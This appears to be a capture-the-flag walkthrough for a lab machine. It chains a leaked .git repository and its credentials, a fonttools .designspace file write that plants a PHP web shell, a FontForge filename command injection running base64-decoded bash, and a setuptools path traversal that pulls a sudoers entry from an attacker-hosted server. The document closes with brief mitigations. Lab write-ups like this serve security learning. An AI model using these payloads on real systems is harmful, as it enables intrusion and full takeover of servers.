1. Reconnaissance

Scanning the target reveals a web server with two virtual hosts:

echo "10.129.9.14 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
nmap -sC -sV -oN nmap.txt 10.129.9.14
  • variatype.htb: Flask application for font generation.
  • portal.variatype.htb: Internal PHP validation portal.

Web enumeration on the portal subdomain reveals an exposed .git directory, which is a critical configuration error.

2. Credential Discovery (Git Leak)

Using git-dumper, we recover the repository. Even though a later commit tried to remove them, the history still contains the credentials in auth.php.

git-dumper http://portal.variatype.htb/.git /tmp/gitdump
cd /tmp/gitdump
git log --oneline
git show 6f021da

Credentials Found: gitbot : G1tB0t_Acc3ss_2025!

Logging into the portal (http://portal.variatype.htb) grants access to the internal dashboard.

3. Initial Foothold (CVE-2025-66034)

The font generator uses fonttools, which is vulnerable to arbitrary file write via the filename attribute in .designspace files. We can also inject PHP code via CDATA tags in the labelname element.

3.1 Generating Base Fonts

# setup.py to generate valid source TTF files
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0)); pen.lineTo((500, 0))
    pen.lineTo((500, 500)); pen.lineTo((0, 500))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    fb.save(filename)

create_source_font("source-light.ttf", weight=100)
create_source_font("source-regular.ttf", weight=400)

3.2 Malicious .designspace Payload

<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="Shell" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>

Uploading these files to variatype.htb/tools/variable-font-generator creates shell.php. Accessing it with cmd=id confirms RCE as www-data.

4. Lateral Movement (CVE-2024-25081)

The user steve runs a cleanup script via cron that uses FontForge to process font files. FontForge is vulnerable to command injection when opening filenames containing $(command).

We bypass the filename character filter by placing the malicious filename inside a ZIP archive.

filename = '$(echo ' + b64_payload + '|base64 -d|bash).ttf'
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr(filename, 'dummy')

Transferring exploit.zip to /var/www/portal.variatype.htb/public/files/ and waiting for the cronjob yields a shell as steve.

5. Privilege Escalation (CVE-2025-47273)

Checking sudo permissions shows steve can run a specific Python script as root:

sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

The script uses an older version of setuptools with a path traversal vulnerability in its URL downloader. By URL-encoding slashes (%2F), we can write a file to an arbitrary location.

5.1 Malicious Server

On Kali, we host a file that gives steve full sudo rights:

echo "steve ALL=(ALL) NOPASSWD: ALL" > authorized_keys
python3 -m http.server 9999

5.2 Exploitation

sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://<KALI_IP>:9999/%2Fetc%2Fsudoers.d%2Fsteve"

With the new sudoers file in place, we simply run sudo su - to get root access.

Mitigations

  • Web Security: Block access to .git directories in production using nginx/Apache rules.
  • Credential Management: Never store hardcoded passwords in source code. Rotate leaked credentials immediately.
  • Patching: Upgrade fonttools, FontForge, and setuptools to the latest patched versions.
  • Least Privilege: Avoid using wildcards (*) in sudoers entries.
